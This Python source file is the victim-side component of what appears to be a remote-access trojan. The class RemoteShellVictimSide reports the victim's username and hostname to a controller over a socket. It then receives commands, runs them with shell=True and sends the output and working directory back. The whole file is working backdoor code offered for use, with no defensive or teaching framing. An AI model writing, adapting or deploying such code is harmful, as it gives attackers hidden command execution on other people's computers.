import os
import subprocess

from src.modlues.protocols.general import GeneralPacket, GeneralPacketType
from src.modlues.protocols.protocol import HandelPacket, Packet, SendPacket, PacketType
from src.modlues.protocols.remote_shell import RemoteShellPacket, RemoteShellPacketType


class RemoteShellVictimSide:

    def __init__(self, sock):
        self.sock = sock
        self.is_connected = False
        self.last_cwd = ''

    def main(self):
        self.__connect()

        while self.is_connected:
            try:
                packet = HandelPacket.recv_packet(self.sock)
                print('got packet')
                self.handle(packet)
            except Exception as e:
                print(e)
                self.is_connected = False
        else:
            pass

    def handle(self, packet: Packet):

        if packet.packet_type == PacketType.REMOTE_SHELL.value:
            if packet.packet_sub_type == RemoteShellPacketType.COMMAND.value:
                print("got commmand")
                print(packet.payload.decode())
                self.execute_and_capture(packet.payload.decode())

    def __connect(self):
        packet = GeneralPacket(GeneralPacketType.ACK)
        SendPacket.send_packet(self.sock, packet)

        packet_payload = f'{os.getlogin()}@{os.uname()[1]}'.encode()
        packet = RemoteShellPacket(RemoteShellPacketType.VICTIM_INFO, packet_payload)
        SendPacket.send_packet(self.sock, packet)

        cwd = os.getcwd()
        if self.last_cwd != cwd:
            self.__senc_cwd(cwd)
            self.last_cwd = cwd

        self.is_connected = True

    def execute_and_capture(self, command: str):

        command = command.split(' ')

        if command[0] == 'cd':
            os.chdir(command[1])
        try:
            result = subprocess.run(command, capture_output=True, text=True, shell=True)
        except subprocess.CalledProcessError as e:
            self.__send_output(str(e))
        else:
            self.__send_output(result.stdout + result.stderr)

        cwd = os.getcwd()
        if self.last_cwd != cwd:
            self.__senc_cwd(cwd)
            self.last_cwd = cwd

    def __get_cwd(self):
        return os.getcwd()

    def __send_output(self, output: str):
        packet = RemoteShellPacket(RemoteShellPacketType.OUTPUT, output.encode())
        SendPacket.send_packet(self.sock, packet)

    def __senc_cwd(self, cwd):
        packet = RemoteShellPacket(RemoteShellPacketType.CWD, cwd.encode())
        SendPacket.send_packet(self.sock, packet)
